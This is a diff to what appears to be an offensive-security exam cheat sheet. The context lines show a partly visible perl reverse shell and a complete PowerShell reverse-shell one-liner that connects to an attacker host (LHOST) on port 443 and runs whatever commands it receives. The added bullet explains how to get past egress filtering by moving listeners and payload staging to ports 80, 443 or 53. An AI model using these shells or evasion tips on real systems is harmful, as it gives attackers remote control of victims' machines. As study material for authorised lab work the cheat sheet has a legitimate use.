@@ -33,6 +33,7 @@ perl -e 'use Socket;$i="LHOST";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobynam
 powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
 ```
 - Generate/encode shells fast: **revshells.com** (memorize the format; can't browse during exam unless you cache it). msfvenom equivalents below.
+- **Shell fires but never connects back?** Suspect egress filtering on the target — outbound is often restricted to a few ports. Before assuming the RCE failed, retry your listener on **80 / 443 / 53** (almost always allowed out). Same applies to staging downloads: host your payload on `:80`/`:443`.
 
 ### Stabilize a Linux TTY (do this immediately)
 ```bash
